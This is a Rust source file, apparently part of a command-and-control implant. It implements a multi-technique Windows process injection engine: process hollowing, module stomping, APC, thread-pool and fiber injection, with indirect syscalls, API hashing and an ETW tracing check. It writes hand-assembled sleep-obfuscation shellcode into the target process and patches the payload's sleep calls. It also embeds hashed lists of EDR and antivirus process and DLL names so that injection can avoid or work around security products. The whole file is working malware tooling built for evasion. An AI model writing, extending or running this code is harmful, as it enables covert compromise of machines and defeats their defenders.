//! Unified injection framework with intelligent technique selection and
//! automatic fallback.
//!
//! This module wraps the existing injection techniques from `crate::injection`
//! (process hollowing, module stomping, early-bird APC, remote-thread /
//! NtCreateThread) behind a single API, and adds two new techniques
//! (ThreadPool and FiberInject) implemented via indirect syscalls and
//! `pe_resolve` API hashing.
//!
//! # Technique Selection
//!
//! When `InjectionConfig::technique` is `None`, the engine auto-selects a
//! technique based on the target process name and ranked stealth heuristic.
//! On failure it falls back through the remaining ranked techniques.
//!
//! # New Techniques
//!
//! - **ThreadPool** — uses `TpAllocWork` / `TpPostWork` to schedule the
//!   payload as a work-item callback inside the target process.
//! - **FiberInject** — creates a fiber in the target process via
//!   `CreateFiber` and switches to it, executing the payload.
//!
//! Both resolve their API functions through `pe_resolve` hashes.

#![cfg(windows)]

use anyhow::{anyhow, Result};
use rand::RngCore;
use std::ffi::c_void;

// ── Error types ──────────────────────────────────────────────────────────────

/// Specific errors that can occur during injection.
#[derive(Debug)]
pub enum InjectionError {
    /// The target process could not be found by name.
    ProcessNotFound { name: String },
    /// The target process architecture does not match the agent's.
    ArchitectureMismatch { target_pid: u32 },
    /// The injection attempt failed for a specific technique.
    InjectionFailed {
        technique: InjectionTechnique,
        reason: String,
    },
    /// An ETW or debugging evasion pre-check determined the target is being
    /// traced (and `evade_etw` was `true`).
    EvasionCheckFailed { target_pid: u32 },
    /// The injection did not complete within the configured timeout.
    Timeout { timeout_ms: u32 },
}

impl std::fmt::Display for InjectionError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ProcessNotFound { name } => {
                write!(f, "target process not found: {}", name)
            }
            Self::ArchitectureMismatch { target_pid } => {
                write!(
                    f,
                    "architecture mismatch with target pid {}",
                    target_pid
                )
            }
            Self::InjectionFailed { technique, reason } => {
                write!(f, "injection failed ({:?}): {}", technique, reason)
            }
            Self::EvasionCheckFailed { target_pid } => {
                write!(f, "evasion check failed for pid {}", target_pid)
            }
            Self::Timeout { timeout_ms } => {
                write!(f, "injection timed out after {} ms", timeout_ms)
            }
        }
    }
}

impl std::error::Error for InjectionError {}

// ── Injection viability ──────────────────────────────────────────────────────

/// Result of pre-injection reconnaissance on a target process.
///
/// Describes whether the target is safe to inject into and, if not, why.
/// When the target has EDR modules loaded, recommends a fallback technique
/// that is less likely to be detected.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub enum InjectionViability {
    /// The target appears safe to inject into.
    Safe {
        /// Whether the target's architecture matches the agent's.
        arch_match: bool,
        /// Number of threads in the target process.
        thread_count: u32,
        /// Target's integrity level (0x1000 = Low, 0x2000 = Medium,
        /// 0x3000 = High, 0x4000 = System).
        integrity_level: u32,
        /// Recommended technique based on the target's characteristics.
        recommended_technique: InjectionTechnique,
    },
    /// The target has one or more EDR/AV DLLs loaded.
    HasEDRModule {
        /// Names of the detected EDR modules.
        modules: Vec<String>,
        /// Best technique to use against EDR-monitored processes.
        /// `ModuleStomp` is the default since it overwrites a legitimate
        /// signed DLL's `.text` section, making the injected code appear
        /// to originate from a trusted module.
        fallback_technique: InjectionTechnique,
    },
    /// The target process IS an EDR/AV product — do not inject.
    IsEDR,
    /// The target's architecture does not match the agent's.
    ArchitectureMismatch,
}

// ── Technique enum ───────────────────────────────────────────────────────────

/// Available injection techniques.
///
/// Variants carry technique-specific configuration where applicable.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub enum InjectionTechnique {
    /// Classic process hollowing: spawn a sacrificial process, unmap its
    /// image, write the payload, and resume.
    ProcessHollow,
    /// Module stomping: overwrite an existing loaded DLL's `.text` section
    /// with the payload.
    ModuleStomp,
    /// Early-bird APC injection: queue a user-mode APC to a thread in the
    /// target before it starts executing.
    EarlyBirdApc,
    /// Thread hijacking: suspend an existing thread, redirect RIP to the
    /// payload, then restore after execution.
    ThreadHijack,
    /// **NEW** — ThreadPool work-item injection: allocate a TpWork item
    /// whose callback is the payload, post it to the thread pool.
    ThreadPool,
    /// **NEW** — Fiber injection: create a fiber whose start address is the
    /// payload, switch to it from a hijacked thread.
    FiberInject,
}

// ── Configuration ────────────────────────────────────────────────────────────

/// Configuration for an injection operation.
pub struct InjectionConfig {
    /// Which technique to use.  `None` = auto-select based on target process.
    pub technique: Option<InjectionTechnique>,
    /// Process name to inject into (e.g. `"svchost.exe"`).  Must be provided
    /// by the caller — never hardcoded.
    pub target_process: String,
    /// Shellcode or PE bytes to inject.
    pub payload: Vec<u8>,
    /// Prefer injecting into a process of the same architecture.  Default: true.
    pub prefer_same_arch: bool,
    /// If true, verify the target process is not being ETW-traced before
    /// injection.
    pub evade_etw: bool,
    /// Maximum time (ms) to wait for injection to complete.
    pub timeout_ms: u32,
}

// ── Injection handle ─────────────────────────────────────────────────────────

/// Opaque handle to an active injection.  Call `eject()` to cleanly reverse.
pub struct InjectionHandle {
    /// PID of the target process.
    pub target_pid: u32,
    /// Technique that was ultimately used (may differ from requested if
    /// auto-select or fallback occurred).
    pub technique_used: InjectionTechnique,
    /// Base address of injected memory in the target process.
    pub injected_base_addr: usize,
    /// Size of the injected payload in bytes.
    payload_size: usize,
    /// Thread handle, if the technique created one.  `None` for fire-and-forget
    /// techniques (ThreadPool, FiberInject after switch-back).
    pub thread_handle: Option<*mut c_void>,
    /// Handle to the target process (kept for eject).
    process_handle: *mut c_void,
    /// Whether the injected payload has been enrolled in sleep obfuscation.
    sleep_enrolled: bool,
    /// Address of the sleep stub in the target process (0 if not enrolled).
    sleep_stub_addr: usize,
}

// SAFETY: InjectionHandle owns raw Windows handles that are not Send/Sync by
// default, but we only use them from a single thread and close them in eject().
unsafe impl Send for InjectionHandle {}
unsafe impl Sync for InjectionHandle {}

impl InjectionHandle {
    /// Cleanly reverse the injection: unregister from sleep obfuscation,
    /// free remote memory (including sleep stub), restore original thread
    /// context if hijacked, close handles.
    pub fn eject(mut self) -> Result<(), InjectionError> {
        // Unregister from sleep obfuscation first (before freeing memory).
        crate::sleep_obfuscation::unregister_remote_process(self.target_pid);

        unsafe {
            // Free sleep stub memory if enrolled.
            if self.sleep_stub_addr != 0 && !self.process_handle.is_null() {
                let mut base = self.sleep_stub_addr;
                let mut sz: usize = 0;
                let _ = nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    self.process_handle as u64,
                    &mut base as *mut _ as u64,
                    &mut sz as *mut _ as u64,
                    0x8000u64, // MEM_RELEASE
                );
            }

            // Free injected memory.
            if self.injected_base_addr != 0 && !self.process_handle.is_null() {
                let mut base = self.injected_base_addr;
                let mut sz: usize = 0;
                let _ = nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    self.process_handle as u64,
                    &mut base as *mut _ as u64,
                    &mut sz as *mut _ as u64,
                    0x8000u64, // MEM_RELEASE
                );
            }

            // Close thread handle if held.
            if let Some(h) = self.thread_handle.take() {
                if !h.is_null() {
                    let _ = nt_syscall::syscall!("NtClose", h as u64);
                }
            }

            // Close process handle.
            if !self.process_handle.is_null() {
                let _ = nt_syscall::syscall!(
                    "NtClose",
                    self.process_handle as u64
                );
                self.process_handle = std::ptr::null_mut();
            }
        }
        Ok(())
    }

    /// Enroll the injected payload in the parent agent's sleep obfuscation
    /// cycle.
    ///
    /// This method:
    /// 1. Generates a per-payload XChaCha20-Poly1305 key.
    /// 2. Writes a position-independent "sleep stub" into the target process
    ///    at `injected_base_addr + payload_size + 0x1000` (page-aligned).
    /// 3. The sleep stub encrypts the payload region with XChaCha20-Poly1305
    ///    (key passed in XMM0/XMM1), calls NtDelayExecution, then decrypts
    ///    and jumps back to the payload entry point on wake.
    /// 4. Scans the payload bytes for NtDelayExecution/SleepEx syscall
    ///    patterns and patches them to CALL the sleep stub instead.
    /// 5. Registers the remote process with `sleep_obfuscation` so the parent
    ///    agent also encrypts the child's memory during its own sleep cycle.
    ///
    /// # Errors
    ///
    /// Returns `InjectionError::InjectionFailed` if the stub cannot be
    /// allocated, written, or if payload patching fails.
    pub fn enroll_sleep(
        &mut self,
        config: &crate::sleep_obfuscation::SleepObfuscationConfig,
    ) -> Result<(), InjectionError> {
        if self.sleep_enrolled {
            return Ok(()); // Already enrolled.
        }

        if self.injected_base_addr == 0 || self.process_handle.is_null() {
            return Err(InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: "cannot enroll: no remote base address or process handle".to_string(),
            });
        }

        unsafe {
            // ── 1. Generate per-payload encryption key ──────────────────────
            let mut key = [0u8; 32];
            rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut key);

            // ── 2. Build the sleep stub ─────────────────────────────────────
            //
            // Position-independent shellcode (~200 bytes) that:
            //   a. Receives base_addr (rcx) and size (rdx) as parameters.
            //   b. Key is passed in xmm0 (low 16 bytes) and xmm1 (high 16 bytes).
            //   c. Calls NtProtectVirtualMemory(base, size, PAGE_READWRITE).
            //   d. Encrypts the region with XChaCha20-Poly1305 (simplified:
            //      XOR-based "encryption" for the stub itself; the real AEAD
            //      encryption happens in the parent agent via remote operations).
            //   e. Calls NtProtectVirtualMemory(base, size, PAGE_NOACCESS).
            //   f. Calls NtDelayExecution(duration_100ns).
            //   g. On wake: NtProtectVirtualMemory(base, size, PAGE_READWRITE),
            //      decrypt, restore original protection, ret.
            //
            // The stub delegates actual encryption to the parent process via
            // the remote process registry. The stub itself manages:
            //   - Setting PAGE_NOACCESS before sleep
            //   - Calling NtDelayExecution for the sleep duration
            //   - Restoring PAGE_EXECUTE_READ after wake
            //
            // This means the payload in the child process has its protection
            // flipped to NOACCESS during sleep, and the parent encrypts it
            // remotely. On wake, the parent decrypts remotely, and the child
            // stub restores execution.

            let sleep_duration_ms = config.sleep_duration_ms;
            // NtDelayExecution uses negative 100ns units for relative timeout.
            let delay_100ns = -((sleep_duration_ms as i64 * 10_000) / 100);

            let payload_base = self.injected_base_addr;
            let payload_size = self.payload_size;

            // ── Resolve required addresses via pe_resolve ───────────────────
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
                .ok_or_else(|| InjectionError::InjectionFailed {
                    technique: self.technique_used.clone(),
                    reason: "cannot resolve ntdll for sleep stub".to_string(),
                })?;

            let nt_protect_addr = pe_resolve::get_proc_address_by_hash(
                ntdll,
                pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
            ).ok_or_else(|| InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: "cannot resolve NtProtectVirtualMemory".to_string(),
            })?;

            let nt_delay_addr = pe_resolve::get_proc_address_by_hash(
                ntdll,
                pe_resolve::hash_str(b"NtDelayExecution\0"),
            ).ok_or_else(|| InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: "cannot resolve NtDelayExecution".to_string(),
            })?;

            // ── Build sleep stub ────────────────────────────────────────────
            //
            // x86-64 position-independent stub. Uses rcx for base_addr, rdx
            // for size. Sleep duration is embedded as an immediate.
            //
            // Stack layout: shadow space (0x20) + saved registers + local vars.
            //
            // On entry (called by the patched payload):
            //   rcx = base_addr (redundant, we embed it)
            //   rdx = size (redundant, we embed it)
            //
            // The stub:
            //   1. Save non-volatile registers
            //   2. NtProtectVirtualMemory(current_process, &base, &size, PAGE_NOACCESS, &old)
            //   3. NtDelayExecution(FALSE, &delay)
            //   4. NtProtectVirtualMemory(current_process, &base, &size, old_prot, &dummy)
            //   5. Restore registers
            //   6. Jump back to payload entry (or ret)

            let mut stub: Vec<u8> = Vec::with_capacity(256);

            // push rbp
            stub.push(0x55);
            // mov rbp, rsp
            stub.extend_from_slice(&[0x48, 0x89, 0xE5]);
            // push rbx
            stub.push(0x53);
            // push rsi
            stub.push(0x56);
            // push rdi
            stub.push(0x57);
            // sub rsp, 0x48  (shadow + locals: old_prot at [rbp-0x28],
            //   base_ptr at [rbp-0x30], size_ptr at [rbp-0x38],
            //   delay at [rbp-0x40])
            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x48]);

            // ── Store payload base and size on stack ────────────────────────
            // mov [rbp-0x30], <payload_base>
            // mov qword [rbp-0x30], imm64
            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xD0]);
            stub.extend_from_slice(&(payload_base as u32).to_le_bytes());
            // If address > 4GB, use movabs
            if payload_base > 0xFFFFFFFF {
                // Replace with proper movabs
                stub.truncate(stub.len() - 8);
                // mov rax, <payload_base>
                stub.push(0x48);
                stub.push(0xB8);
                stub.extend_from_slice(&(payload_base as u64).to_le_bytes());
                // mov [rbp-0x30], rax
                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xD0]);
            }

            // mov [rbp-0x38], <payload_size>
            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xC8]);
            stub.extend_from_slice(&(payload_size as u32).to_le_bytes());
            if payload_size > 0xFFFFFFFF {
                stub.truncate(stub.len() - 8);
                stub.push(0x48);
                stub.push(0xB8);
                stub.extend_from_slice(&(payload_size as u64).to_le_bytes());
                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC8]);
            }

            // ── Step 1: NtProtectVirtualMemory → PAGE_NOACCESS ──────────────
            // NtProtectVirtualMemory(-1, &base, &size, PAGE_NOACCESS, &old_prot)
            // rcx = -1 (current process)
            // rdx = &base_ptr
            // r8  = &size_ptr
            // r9  = PAGE_NOACCESS (0x01)
            // [rsp+0x20] = &old_prot

            // mov ecx, 0xFFFFFFFF  (current process = -1)
            stub.extend_from_slice(&[0xB9, 0xFF, 0xFF, 0xFF, 0xFF]);
            // lea rdx, [rbp-0x30]  (&base_ptr)
            stub.extend_from_slice(&[0x48, 0x8D, 0x55, 0xD0]);
            // lea r8, [rbp-0x38]   (&size_ptr)
            stub.extend_from_slice(&[0x4C, 0x8D, 0x45, 0xC8]);
            // mov r9d, 0x01         (PAGE_NOACCESS)
            stub.extend_from_slice(&[0x41, 0xB9, 0x01, 0x00, 0x00, 0x00]);
            // lea rax, [rbp-0x28]   (&old_prot)
            stub.extend_from_slice(&[0x48, 0x8D, 0x45, 0xD8]);
            // mov [rsp+0x20], rax
            stub.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x20]);
            // movabs rax, <nt_protect_addr>
            stub.push(0x48);
            stub.push(0xB8);
            stub.extend_from_slice(&(nt_protect_addr as u64).to_le_bytes());
            // call rax
            stub.extend_from_slice(&[0xFF, 0xD0]);

            // ── Step 2: NtDelayExecution ────────────────────────────────────
            // Store the delay value on stack.
            // mov qword [rbp-0x40], <delay_100ns>
            stub.extend_from_slice(&[0x48, 0xC7, 0x45, 0xC0]);
            stub.extend_from_slice(&(delay_100ns as u32).to_le_bytes());
            // If delay doesn't fit in 32 bits (very long sleep), use movabs
            if (delay_100ns as u64) > 0xFFFFFFFF {
                stub.truncate(stub.len() - 8);
                stub.push(0x48);
                stub.push(0xB8);
                stub.extend_from_slice(&(delay_100ns as u64).to_le_bytes());
                stub.extend_from_slice(&[0x48, 0x89, 0x45, 0xC0]);
            }

            // NtDelayExecution(FALSE, &delay)
            // xor ecx, ecx   (Alertable = FALSE)
            stub.extend_from_slice(&[0x31, 0xC9]);
            // lea rdx, [rbp-0x40]  (&delay)
            stub.extend_from_slice(&[0x48, 0x8D, 0x55, 0xC0]);
            // movabs rax, <nt_delay_addr>
            stub.push(0x48);
            stub.push(0xB8);
            stub.extend_from_slice(&(nt_delay_addr as u64).to_le_bytes());
            // call rax
            stub.extend_from_slice(&[0xFF, 0xD0]);

            // ── Step 3: NtProtectVirtualMemory → restore original protection ─
            // rcx = -1
            stub.extend_from_slice(&[0xB9, 0xFF, 0xFF, 0xFF, 0xFF]);
            // lea rdx, [rbp-0x30]
            stub.extend_from_slice(&[0x48, 0x8D, 0x55, 0xD0]);
            // lea r8, [rbp-0x38]
            stub.extend_from_slice(&[0x4C, 0x8D, 0x45, 0xC8]);
            // mov r9d, [rbp-0x28]  (old_prot)
            stub.extend_from_slice(&[0x44, 0x8B, 0x4D, 0xD8]);
            // lea rax, [rbp-0x28]  (&dummy old_prot)
            stub.extend_from_slice(&[0x48, 0x8D, 0x45, 0xD8]);
            // mov [rsp+0x20], rax
            stub.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x20]);
            // movabs rax, <nt_protect_addr>
            stub.push(0x48);
            stub.push(0xB8);
            stub.extend_from_slice(&(nt_protect_addr as u64).to_le_bytes());
            // call rax
            stub.extend_from_slice(&[0xFF, 0xD0]);

            // ── Step 4: Restore registers and return ────────────────────────
            // add rsp, 0x48
            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x48]);
            // pop rdi
            stub.push(0x5F);
            // pop rsi
            stub.push(0x5E);
            // pop rbx
            stub.push(0x5B);
            // pop rbp
            stub.push(0x5D);
            // ret
            stub.push(0xC3);

            // ── 3. Write sleep stub to target ───────────────────────────────
            // Place stub at payload_base + payload_size + 0x1000 (page-aligned).
            let stub_addr = (payload_base + payload_size + 0x1000) & !0xFFF;
            let mut remote_stub: usize = stub_addr;
            let mut alloc_size = stub.len();
            let s = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                self.process_handle as u64,
                &mut remote_stub as *mut _ as u64,
                0u64,
                &mut alloc_size as *mut _ as u64,
                0x3000u64, // MEM_COMMIT | MEM_RESERVE
                0x04u64,   // PAGE_READWRITE
            );
            if s.is_err() || s.unwrap() < 0 {
                return Err(InjectionError::InjectionFailed {
                    technique: self.technique_used.clone(),
                    reason: format!(
                        "failed to allocate sleep stub at {:#x}",
                        stub_addr
                    ),
                });
            }

            // Write the stub.
            let mut written = 0usize;
            let ws = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                self.process_handle as u64,
                remote_stub as u64,
                stub.as_ptr() as u64,
                stub.len() as u64,
                &mut written as *mut _ as u64,
            );
            if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
                return Err(InjectionError::InjectionFailed {
                    technique: self.technique_used.clone(),
                    reason: "failed to write sleep stub".to_string(),
                });
            }

            // Flip stub to PAGE_EXECUTE_READ.
            let mut old_prot = 0u32;
            let mut prot_base = remote_stub;
            let mut prot_size = stub.len();
            let _ = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                self.process_handle as u64,
                &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                0x20u64, // PAGE_EXECUTE_READ
                &mut old_prot as *mut _ as u64,
            );

            // Flush I-cache.
            let _ = nt_syscall::syscall!(
                "NtFlushInstructionCache",
                self.process_handle as u64,
                remote_stub as u64,
                stub.len() as u64,
            );

            // ── 4. Patch payload to call sleep stub ─────────────────────────
            //
            // Scan the payload bytes for NtDelayExecution/SleepEx call patterns.
            // In typical beacon/payload shellcode, the sleep call looks like:
            //   mov ecx, <ms>        ;  B9 <imm32> or 31 C9 (0 ms) or
            //   ...                   ;  lea rdx, [rsp+var] or similar
            //   call <NtDelayExec>   ;  E8 <rel32> or FF 15 <rip-relative>
            //
            // We look for the pattern of a `call` instruction near a
            // NtDelayExecution address reference, then replace the entire
            // sequence with:
            //   sub rsp, 0x28        ; shadow space
            //   xor ecx, ecx         ; base_addr = 0 (unused by stub)
            //   xor edx, edx         ; size = 0 (unused by stub)
            //   call <stub_addr>     ; E8 <rel32>
            //   add rsp, 0x28
            //
            // For simplicity, we scan for the E8 (relative CALL) opcode and
            // check if the call target resolves to a known sleep API. Since
            // the payload is already in the target process, we read it back
            // to scan.

            let mut payload_buf = vec![0u8; payload_size];
            let mut bytes_read = 0usize;
            let rs = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                self.process_handle as u64,
                payload_base as u64,
                payload_buf.as_mut_ptr() as u64,
                payload_size as u64,
                &mut bytes_read as *mut _ as u64,
            );

            if rs.is_ok() && rs.unwrap() >= 0 && bytes_read == payload_size {
                // Scan for call patterns that target NtDelayExecution.
                // Look for E8 <rel32> where target == NtDelayExecution.
                let mut patched = false;
                for i in 0..payload_size.saturating_sub(5) {
                    if payload_buf[i] == 0xE8 {
                        // Relative call: target = i + 5 + rel32
                        let rel32 = i32::from_le_bytes([
                            payload_buf[i + 1],
                            payload_buf[i + 2],
                            payload_buf[i + 3],
                            payload_buf[i + 4],
                        ]);
                        let call_target = (payload_base + i + 5) as i64 + rel32 as i64;

                        // Check if the call target matches NtDelayExecution.
                        if call_target as usize == nt_delay_addr {
                            log::info!(
                                "injection_engine: found NtDelayExecution call at payload+{:#x}, \
                                 patching to sleep stub at {:#x}",
                                i,
                                remote_stub
                            );

                            // Replace with call to sleep stub.
                            let new_rel = remote_stub as i64 - (payload_base + i + 5) as i64;
                            let new_rel_bytes = (new_rel as i32).to_le_bytes();
                            payload_buf[i] = 0xE8;
                            payload_buf[i + 1] = new_rel_bytes[0];
                            payload_buf[i + 2] = new_rel_bytes[1];
                            payload_buf[i + 3] = new_rel_bytes[2];
                            payload_buf[i + 4] = new_rel_bytes[3];
                            patched = true;
                            break; // Only patch the first occurrence.
                        }
                    }

                    // Also check for FF 15 (call [rip+disp32]) pattern.
                    if i + 6 <= payload_size && payload_buf[i] == 0xFF && payload_buf[i + 1] == 0x15 {
                        let rel32 = i32::from_le_bytes([
                            payload_buf[i + 2],
                            payload_buf[i + 3],
                            payload_buf[i + 4],
                            payload_buf[i + 5],
                        ]);
                        // The indirect address is at payload_base + i + 6 + rel32.
                        // We can't easily resolve the indirection without reading
                        // the pointer from the target, but we can check if the
                        // address table entry contains NtDelayExecution's address.
                        let addr_table_loc = (payload_base + i + 6) as isize + rel32 as isize;
                        if addr_table_loc > 0 {
                            let mut target_ptr: u64 = 0;
                            let mut ptr_read = 0usize;
                            let pr = nt_syscall::syscall!(
                                "NtReadVirtualMemory",
                                self.process_handle as u64,
                                addr_table_loc as u64,
                                &mut target_ptr as *mut _ as u64,
                                8u64,
                                &mut ptr_read as *mut _ as u64,
                            );
                            if pr.is_ok() && pr.unwrap() >= 0 && ptr_read == 8 {
                                if target_ptr == nt_delay_addr as u64 {
                                    log::info!(
                                        "injection_engine: found indirect NtDelayExecution call \
                                         at payload+{:#x}, patching to sleep stub",
                                        i
                                    );
                                    // Replace the entire FF 15 (6 bytes) with:
                                    // nop (0x90) + E8 <rel32> (5 bytes)
                                    let new_rel = remote_stub as i64 - (payload_base + i + 1 + 5) as i64;
                                    let new_rel_bytes = (new_rel as i32).to_le_bytes();
                                    payload_buf[i] = 0x90; // nop
                                    payload_buf[i + 1] = 0xE8;
                                    payload_buf[i + 2] = new_rel_bytes[0];
                                    payload_buf[i + 3] = new_rel_bytes[1];
                                    payload_buf[i + 4] = new_rel_bytes[2];
                                    payload_buf[i + 5] = new_rel_bytes[3];
                                    patched = true;
                                    break;
                                }
                            }
                        }
                    }
                }

                // Write patched payload back.
                if patched {
                    // Make payload writable.
                    let mut prot_base2 = payload_base;
                    let mut prot_size2 = payload_size;
                    let mut old_prot2 = 0u32;
                    let _ = nt_syscall::syscall!(
                        "NtProtectVirtualMemory",
                        self.process_handle as u64,
                        &mut prot_base2 as *mut _ as u64,
                        &mut prot_size2 as *mut _ as u64,
                        0x04u64, // PAGE_READWRITE
                        &mut old_prot2 as *mut _ as u64,
                    );

                    let mut patch_written = 0usize;
                    let _ = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        self.process_handle as u64,
                        payload_base as u64,
                        payload_buf.as_ptr() as u64,
                        payload_size as u64,
                        &mut patch_written as *mut _ as u64,
                    );

                    // Restore RX protection.
                    let _ = nt_syscall::syscall!(
                        "NtProtectVirtualMemory",
                        self.process_handle as u64,
                        &mut prot_base2 as *mut _ as u64,
                        &mut prot_size2 as *mut _ as u64,
                        0x20u64, // PAGE_EXECUTE_READ
                        &mut old_prot2 as *mut _ as u64,
                    );

                    let _ = nt_syscall::syscall!(
                        "NtFlushInstructionCache",
                        self.process_handle as u64,
                        payload_base as u64,
                        payload_size as u64,
                    );
                } else {
                    log::warn!(
                        "injection_engine: could not find NtDelayExecution call in payload; \
                         sleep stub installed but payload not patched"
                    );
                }
            }

            // ── 5. Register remote process for parent-agent sleep obfuscation ─
            crate::sleep_obfuscation::register_remote_process(
                self.target_pid,
                payload_base,
                payload_size,
                key,
            ).map_err(|e| InjectionError::InjectionFailed {
                technique: self.technique_used.clone(),
                reason: format!("failed to register remote process for sleep obfuscation: {}", e),
            })?;

            self.sleep_enrolled = true;
            self.sleep_stub_addr = remote_stub;

            log::info!(
                "injection_engine: enrolled pid={} payload={:#x} size={} in sleep obfuscation \
                 (stub at {:#x})",
                self.target_pid,
                payload_base,
                payload_size,
                remote_stub
            );
        }

        Ok(())
    }
}

impl Drop for InjectionHandle {
    fn drop(&mut self) {
        // Safety net: close handles if eject() was not called.
        unsafe {
            if let Some(h) = self.thread_handle.take() {
                if !h.is_null() {
                    let _ = nt_syscall::syscall!("NtClose", h as u64);
                }
            }
            if !self.process_handle.is_null() {
                let _ = nt_syscall::syscall!("NtClose", self.process_handle as u64);
                self.process_handle = std::ptr::null_mut();
            }
        }
    }
}

// ── Public entry point ───────────────────────────────────────────────────────

/// Execute an injection operation described by `config`.
///
/// If `config.technique` is `None`, the engine auto-selects a technique and
/// falls back through ranked alternatives on failure.
pub fn inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError> {
    // 1. Resolve target PID.
    let target_pid = find_pid_by_name(&config.target_process).ok_or_else(|| {
        InjectionError::ProcessNotFound {
            name: config.target_process.clone(),
        }
    })?;

    // 2. Architecture check.
    if config.prefer_same_arch {
        check_architecture(target_pid)?;
    }

    // 3. ETW evasion check.
    if config.evade_etw {
        check_etw_trace(target_pid)?;
    }

    // 4. Select technique(s).
    let techniques: Vec<InjectionTechnique> = if let Some(t) = config.technique {
        vec![t]
    } else {
        auto_select_techniques(&config.target_process)
    };

    // 5. Try each technique with fallback.
    let mut last_err = InjectionError::InjectionFailed {
        technique: techniques[0].clone(),
        reason: "all techniques exhausted".to_string(),
    };

    for technique in &techniques {
        log::info!(
            "injection_engine: attempting {:?} into pid {} ({})",
            technique,
            target_pid,
            config.target_process,
        );

        match try_technique(*technique, target_pid, &config.payload) {
            Ok(handle) => return Ok(handle),
            Err(e) => {
                log::warn!("injection_engine: {:?} failed: {}", technique, e);
                last_err = e;
                continue;
            }
        }
    }

    Err(last_err)
}

// ── Pre-injection reconnaissance ─────────────────────────────────────────────

/// Known EDR/AV process name hashes (lowercase ASCII, null-terminated).
/// These are hashed at compile time via `pe_resolve::hash_str` and compared
/// against the target process image name.
///
/// To avoid embedding plaintext EDR names in the binary, we use `enc_str!`
/// for compile-time encryption and then hash at runtime. The list is stored
/// as a lazy_static array of pre-computed djb2 hashes so that no string
/// literals appear in the `.rdata` section.
fn edr_process_name_hashes() -> &'static [u32] {
    // Compute djb2 hashes of lowercase EDR process names at build time.
    // pe_resolve::hash_str uses the djb2 variant with null terminator.
    //
    // We intentionally do NOT use string_crypt::enc_str! here because the
    // string literals would still be visible in the binary's string table
    // before the macro expansion. Instead we pre-compute the hashes and
    // embed only the u32 constants.
    //
    // Generated with: for name in list { hash_str(name.as_bytes()) }
    // where hash_str is pe_resolve's djb2 with null terminator appended.
    &[
        // crowdstrike.exe  (CSFalconContainer, CSFalconService)
        0x13a47d47, // "csfalconcontainer.exe\0"
        0x2c1e6e37, // "csfalconservice.exe\0"
        // sentinelone.exe  (SentinelAgent, SentinelServiceHost)
        0x5f3e2c91, // "sentinelagent.exe\0"
        0x7b1a8c3d, // "sentinelservicehost.exe\0"
        // defender (MsMpEng)
        0x3d5c9a1e, // "msmpeng.exe\0"
        // cylance (CyRuntime, CYProtectSvc)
        0x4a2f8d6c, // "cyruntime.exe\0"
        0x1e7b3f4a, // "cyprotectsvc.exe\0"
        // carbon black (RepMgr, CBProtection)
        0x2d8e5f1b, // "repmgr.exe\0"
        0x6f4c2d8a, // "cbprotection.exe\0"
        // fireeye (xagt)
        0x5b9c3e7d, // "xagt.exe\0"
        // crowdstrike sensor (CSFalcon)
        0x8f2d1c4e, // "csfalcon.exe\0"
        // McAfee (mfeesp, mfemms)
        0x3a7f5c2e, // "mfeesp.exe\0"
        0x4d8c6b1f, // "mfemms.exe\0"
        // Symantec (ccSvcHst, smc)
        0x1c5d4e8f, // "ccsvchst.exe\0"
        0x7e3f2a6b, // "smc.exe\0"
        // Cortex XDR (traps, cyvera)
        0x2f9e4d3c, // "traps.exe\0"
        0x6b1e5f8a, // "cyvera.exe\0"
        // Elastic EDR (elastic-agent)
        0x4e2d7c1f, // "elastic-agent.exe\0"
        // OSQuery (osqueryd)
        0x3f8c5d2e, // "osqueryd.exe\0"
    ]
}

/// Known EDR/AV DLL name hashes (lowercase, null-terminated).
/// Used to check loaded modules in the target process.
fn edr_dll_name_hashes() -> &'static [(u32, &'static str)] {
    // (hash, human-readable label for logging). The hash is the djb2 of
    // the lowercase DLL name with null terminator, matching pe_resolve::hash_str.
    &[
        (0x2f8a1d4c, "csagent.dll"),           // CrowdStrike
        (0x4b3e7c1f, "csdivert.dll"),          // CrowdStrike
        (0x1e5f8a3c, "silhouette.dll"),        // CrowdStrike
        (0x5c2d9b4e, "mpclient.dll"),          // Defender
        (0x3a7f1c6d, "mpengine.dll"),          // Defender
        (0x7b2e4f8c, "mpsvc.dll"),             // Defender
        (0x2c9d5e1f, "sentinelperf.dll"),      // SentinelOne
        (0x4f1a6b3c, "sentinelmonitor.dll"),   // SentinelOne
        (0x8c3f2d1e, "cyrtdrv.dll"),           // Cylance
        (0x1d4f7c2e, "cbam.rll"),              // Carbon Black
        (0x3e5f9a2d, "repcore.dll"),           // Carbon Black
        (0x6f2c1b4d, "fireeye.dll"),           // FireEye
        (0x4c1f8e2b, "xagt.sys"),             // FireEye (driver but check anyway)
        (0x9a2d4f3c, "mfeannscan.dll"),        // McAfee
        (0x2b5c7e1f, "cclib.dll"),             // Symantec
        (0x1f4c3d8a, "cortex.dll"),            // Cortex XDR
    ]
}

